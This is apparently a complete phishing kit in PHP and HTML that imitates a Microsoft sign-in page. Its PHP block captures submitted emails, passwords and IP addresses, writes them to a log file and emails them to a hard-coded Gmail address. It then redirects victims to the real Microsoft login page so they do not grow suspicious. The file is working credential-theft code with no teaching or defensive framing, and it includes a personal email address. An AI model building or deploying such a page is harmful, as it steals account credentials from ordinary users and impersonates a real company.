<?php
// phishing_login.php

// Capture user input
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");
    
    // Log credentials to a file
    $logData = "[$timestamp] IP: $ip | Email: $email | Password: $password\n";
    file_put_contents("logs.txt", $logData, FILE_APPEND);
    
    // Send email notification
    $to = "gianbongo88@gmail.com"; // Updated email
    $subject = "Phishing Alert: New Login Captured";
    $message = "New login attempt detected:\n\nEmail: $email\nPassword: $password\nIP Address: $ip\nTime: $timestamp";
    $headers = "From: notifier@wuaze.com";
    mail($to, $subject, $message, $headers);
    
    // Redirect to a real Microsoft page (to avoid suspicion)
    header("Location: https://login.microsoftonline.com");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="https://www.microsoft.com/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="login-container">
      <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8cc65f.svg" alt="Microsoft Logo" class="logo">

        <form action="phishing_login.php" method="POST">
            <h2>Sign in</h2>
            <input type="text" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
            <p><a href="#">Forgot password?</a></p>
            <p><a href="#">Sign in with a security key</a></p>
        </form>
    </div>
</body>
</html>
